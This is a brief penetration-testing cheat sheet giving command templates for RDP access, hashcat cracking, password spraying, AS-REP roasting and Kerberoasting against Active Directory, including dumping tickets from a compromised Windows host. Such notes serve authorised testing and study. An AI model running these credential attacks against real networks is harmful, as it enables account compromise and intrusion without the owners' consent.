## Nmap 



### Connecting to RDP
```sh
xfreerdp3 /u:<username> /d:<domain> /p:<pwd> /v:<IP>
```
```sh
xfreerdp /cert-ignore /u:<uname> /d:<domain> /p:<pwd> /v:<IP>
```


### Hashcat

https://hashcat.net/wiki/doku.php?id=example_hashes

```sh
hashcat -m <number> hash wordlists.txt --force
```


## Active Directory 

### Password Spraying

*Crackmapexec - check if the output shows 'Pwned!'*
```sh 
crackmapexec smb <IP or subnet> -u users.txt -p 'pass' -d <domain> --continue-on-success
```

```sh Kerbrute
kerbrute passwordspray -d corp.com .\usernames.txt "pass"
```

### AS-REP Roasting

*Hash of AS-REP Roastable accounts*
```sh
impacket-GetNPUsers -dc-ip <DC-IP> <domain>/<user>:<pass> -request
```

### Kerberoasting

*dumping from compromised windows host, and saving with customname*

```sh
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast #dumping from compromised windows host, and saving with customname

impacket-GetUserSPNs -dc-ip <DC-IP> <domain>/<user>:<pass> -request #from kali machine

hashcat -m 13100 hashes.txt wordlist.txt --force # cracking hashes
```

